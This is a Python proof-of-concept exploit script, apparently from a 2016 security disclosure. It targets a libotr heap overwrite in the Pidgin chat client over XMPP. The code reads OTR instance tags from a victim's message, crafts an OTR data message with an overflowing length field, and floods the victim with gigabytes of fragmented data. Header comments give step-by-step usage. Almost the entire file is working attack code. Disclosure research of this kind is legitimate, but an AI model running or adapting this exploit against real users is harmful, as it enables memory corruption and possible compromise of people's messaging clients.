#!/usr/bin/python -u
#
### PoC libotr heap overwrite on Pidgin
### 2016-02-17 Markus Vervier
### X41 D-Sec GmbH

### initial code taken from pyxmpp examples (echobot.py)

### PoC was tested using a standard Prosody XMPP-Server on Arch-Linux allowing 20MB sized messages by default (and even larger)

### On a loopback interface the exploit took several minutes,
### using XMPP stream compression this could be reduced massively

### pyxmpp does not support it
### We used XMPP connections without TLS to not further complicate the setup

### USAGE
### 
### Prerequisite: 2 Jabber Accounts (attacker, victim), set Ressource of attacker to "attacktest"

### 1. Initiate an encrypted session from attacker-account to victim-account (e.g. using pidgin)
### 2. Disconnect the attacker account
### 3. Fire up this script and let it connect with the attacker account credentials
### 4. Send a message from victim to attacker
### 5. Wait until message sending is complete, pidgin should crash

### !!! Steps 2-5 (and especially user interaction) are only necessary for this PoC
### !!! If we would implement full OTR in this script we could send the bad message directly
### !!! For easier PoC we now wait until an encrypted message is received to get the correct instance tags

import sys
import logging
import locale
import codecs
import os, signal
import time
import base64

def ignore_signal_pipe(signum, frame):
    print 'signal pipe caught -- IGNORING'

signal.signal(signal.SIGPIPE, ignore_signal_pipe)

from struct import *
from pyxmpp.all import JID,Iq,Presence,Message,StreamError
from pyxmpp.jabber.client import JabberClient
from pyxmpp.interface import implements
from pyxmpp.interfaces import *
from pyxmpp.streamtls import TLSSettings
from enum import Enum

class EchoHandler(object):
    """Provides the actual 'echo' functionality.

    Handlers for presence and message stanzas are implemented here.
    """

    implements(IMessageHandlersProvider, IPresenceHandlersProvider)
    
    def __init__(self, client):
        """Just remember who created this."""
        self.client = client

    def get_message_handlers(self):
        """Return list of (message_type, message_handler) tuples.

        The handlers returned will be called when matching message is received
        in a client session."""
        return [
            ("normal", self.message),
            ]

    def get_presence_handlers(self):
        """Return list of (presence_type, presence_handler) tuples.

        The handlers returned will be called when matching presence stanza is
        received in a client session."""
        return [
            (None, self.presence),
            ("unavailable", self.presence),
            ("subscribe", self.presence_control),
            ("subscribed", self.presence_control),
            ("unsubscribe", self.presence_control),
            ("unsubscribed", self.presence_control),
            ]

    def message(self,stanza):
        """Message handler for the component.

        Echoes the message back if its type is not 'error' or
        'headline', also sets own presence status to the message body. Please
        note that all message types but 'error' will be passed to the handler
        for 'normal' message unless some dedicated handler process them.

        :returns: `True` to indicate, that the stanza should not be processed
        any further."""
        subject=stanza.get_subject()
        body=stanza.get_body()
        t=stanza.get_type()
        m = 0 
        print u'Message from %s received.' % (unicode(stanza.get_from(),)),
        if subject:
            print u'Subject: "%s".' % (subject,),
        if body:
            print u'Body: "%s".' % (body,),
        if t:
            print u'Type: "%s".' % (t,)
        else:
            print u'Type: "normal".'
        if stanza.get_type()=="headline":
            # 'headline' messages should never be replied to
            return True
        # record instance tag
        if body[:9] == u'?OTR:AAMD':
            (self.instance_tag, self.our_tag) = self.parse_aamc(body[len("?OTR:AAMD"):])
            print "parsed instance tag: %s and our tag %s" % (self.instance_tag.encode("hex"), self.our_tag.encode("hex") )
            self.send_insane_otr(stanza, 1024*1024*20, self.instance_tag, self.our_tag)
        
        return m

    def b64maxlen(self, chars):
        return 1 + (4 * chars / 3)

    def parse_aamc(self, msg):
        maxlen = self.b64maxlen(8) # 4 byte integer
        print "maxlen %u" % (maxlen)
        tmp = msg[0:maxlen]
        padding = ""
        if maxlen % 4 > 1:
            padding = "="*(4-(maxlen % 4))
        tmp += padding
        print "decoding: "+tmp
        packed = base64.b64decode(tmp)
#        return unpack("I", packed[0:4])
        return (packed[0:4], packed[4:8]) # their tag, our tag

    def initial_body(self, instance_tag, our_tag):
        ret = "?OTR:AAMD";
        raw = b''
        print "packing initial block with instance tag: %s and our tag: %s" % (instance_tag.encode("hex"), our_tag.encode("hex"))
        #dirty hack
        raw += our_tag # sender_nstance_id
        raw += instance_tag # receiver_id
        raw += "D" # dummy flags
        raw += pack("I", 0x1) # sender key id
        raw += pack("I", 0x2) # recipient key id
        raw += pack("!I", 10) # len next_y
	raw += "B"*10 # next_y # we don't know how mpi works but it seems ok ;)
        raw += "12345678" # reveal sig dummy
        # yeah overflow!
        raw += pack("I", 0xFFFFFFFF); # datalen

        ret += base64.b64encode(raw+"A"*(57-len(raw)))
        return ret

    def send_insane_otr(self, stanza, frag_size, instance_tag, our_tag):
        print "G-FUNK!"

        # this should result in about 0xFFFFFFFF times "A" base64 encoded        
        len_msg = 5726623060
        # fix frag size for base64
        frag_size = (frag_size / 4) * 4

        frag_msg = "QUFB"*(frag_size / 4)

        n = len_msg / frag_size 
        # does not evenly divide?
        if len_msg % frag_size > 0:
            n += 1
        k = 1
        n += 1 # initialbody adds another frame
        initialbody = "?OTR,%hu,%hu,%s," % (k , n , self.initial_body(instance_tag, our_tag))
        print "first fragment: "+initialbody
        m = Message(
                to_jid=stanza.get_from(),
                from_jid=stanza.get_to(),
                stanza_type=stanza.get_type(),
                subject="foo",
                body=initialbody)
        self.client.stream.send(m)
        k += 1
        print "frag size: %s, len_msg: %u, num_frags: %u" % (frag_size, len_msg, n)
        cur_pos = 0
        while(cur_pos < len_msg):
            body = "?OTR,%hu,%hu,%s," % (k , n , frag_msg)
            m = Message(
                to_jid=stanza.get_from(),
                from_jid=stanza.get_to(),
                stanza_type=stanza.get_type(),
                subject="foo",
                body=body)
            print "cur_pos %u of %u" % (cur_pos, len_msg)
            self.client.stream.send(m)
            k += 1
            cur_pos = frag_size * (k-2)
            time.sleep(0.9)
        print "FINAL FRAG: cur_pos %u of %u" % (cur_pos, len_msg)

 
    def presence(self,stanza):
        """Handle 'available' (without 'type') and 'unavailable' <presence/>."""
        msg=u"%s has become " % (stanza.get_from())
        t=stanza.get_type()
        if t=="unavailable":
            msg+=u"unavailable"
        else:
            msg+=u"available"

        show=stanza.get_show()
        if show:
            msg+=u"(%s)" % (show,)

        status=stanza.get_status()
        if status:
            msg+=u": "+status
        print msg

    def presence_control(self,stanza):
        """Handle subscription control <presence/> stanzas -- acknowledge
        them."""
        msg=unicode(stanza.get_from())
        t=stanza.get_type()
        if t=="subscribe":
            msg+=u" has requested presence subscription."
        elif t=="subscribed":
            msg+=u" has accepted our presence subscription request."
        elif t=="unsubscribe":
            msg+=u" has canceled his subscription of our."
        elif t=="unsubscribed":
            msg+=u" has canceled our subscription of his presence."

        print msg

        return stanza.make_accept_response()


class VersionHandler(object):
    """Provides handler for a version query.
    
    This class will answer version query and announce 'jabber:iq:version' namespace
    in the client's disco#info results."""
    
    implements(IIqHandlersProvider, IFeaturesProvider)

    def __init__(self, client):
        """Just remember who created this."""
        self.client = client

    def get_features(self):
        """Return namespace which should the client include in its reply to a
        disco#info query."""
        return ["jabber:iq:version"]

    def get_iq_get_handlers(self):
        """Return list of tuples (element_name, namespace, handler) describing
        handlers of <iq type='get'/> stanzas"""
        return [
            ("query", "jabber:iq:version", self.get_version),
            ]

    def get_iq_set_handlers(self):
        """Return empty list, as this class provides no <iq type='set'/> stanza handler."""
        return []

    def get_version(self,iq):
        """Handler for jabber:iq:version queries.

        jabber:iq:version queries are not supported directly by PyXMPP, so the
        XML node is accessed directly through the libxml2 API.  This should be
        used very carefully!"""
        iq=iq.make_result_response()
        q=iq.new_query("jabber:iq:version")
        q.newTextChild(q.ns(),"name","Echo component")
        q.newTextChild(q.ns(),"version","1.0")
        return iq

class Client(JabberClient):
    """Simple bot (client) example. Uses `pyxmpp.jabber.client.JabberClient`
    class as base. That class provides basic stream setup (including
    authentication) and Service Discovery server. It also does server address
    and port discovery based on the JID provided."""

    def __init__(self, jid, password, tls_cacerts):
        # if bare JID is provided add a resource -- it is required
        if not jid.resource:
            jid=JID(jid.node, jid.domain, "attacktest")

        if tls_cacerts:
            if tls_cacerts == 'tls_noverify':
                tls_settings = TLSSettings(require = True, verify_peer = False)
            else:
                tls_settings = TLSSettings(require = True, cacert_file = tls_cacerts)
        else:
            tls_settings = None

        # setup client with provided connection information
        # and identity data
        JabberClient.__init__(self, jid, password,
                disco_name="PyXMPP example: echo bot", disco_type="bot",
                tls_settings = tls_settings)

        # add the separate components
        self.interface_providers = [
            VersionHandler(self),
            EchoHandler(self),
            ]

    def stream_state_changed(self,state,arg):
        """This one is called when the state of stream connecting the component
        to a server changes. This will usually be used to let the user
        know what is going on."""
        print "*** State changed: %s %r ***" % (state,arg)

    def print_roster_item(self,item):
        if item.name:
            name=item.name
        else:
            name=u""
        print (u'%s "%s" subscription=%s groups=%s'
                % (unicode(item.jid), name, item.subscription,
                    u",".join(item.groups)) )

    def roster_updated(self,item=None):
        if not item:
            print u"My roster:"
            for item in self.roster.get_items():
                self.print_roster_item(item)
            return
        print u"Roster item updated:"
        self.print_roster_item(item)

# XMPP protocol is Unicode-based to properly display data received
# _must_ convert it to local encoding or UnicodeException may be raised
locale.setlocale(locale.LC_CTYPE, "")
encoding = locale.getlocale()[1]
if not encoding:
    encoding = "us-ascii"
sys.stdout = codecs.getwriter(encoding)(sys.stdout, errors = "replace")
sys.stderr = codecs.getwriter(encoding)(sys.stderr, errors = "replace")


# PyXMPP uses `logging` module for its debug output
# applications should set it up as needed
logger = logging.getLogger()
logger.addHandler(logging.StreamHandler())
logger.setLevel(logging.INFO) # change to DEBUG for higher verbosity

if len(sys.argv) < 3:
    print u"Usage:"
    print "\t%s JID password ['tls_noverify'|cacert_file]" % (sys.argv[0],)
    print "example:"
    print "\t%s test@localhost verysecret" % (sys.argv[0],)
    sys.exit(1)

print u"creating client..."

c=Client(JID(sys.argv[1]), sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else None)

print u"connecting..."
c.connect()

print u"looping..."
try:
    # Component class provides basic "main loop" for the applitation
    # Though, most applications would need to have their own loop and call
    # component.stream.loop_iter() from it whenever an event on
    # component.stream.fileno() occurs.
    c.loop(1)
except IOError, e:
    if e.errno == errno.EPIPE:
    # IGNORE EPIPE error
        print "PIPE ERROR -- IGNORING"
    else:
        pass


except KeyboardInterrupt:
    print u"disconnecting..."
    c.disconnect()

print u"exiting..."
# vi: sts=4 et sw=4
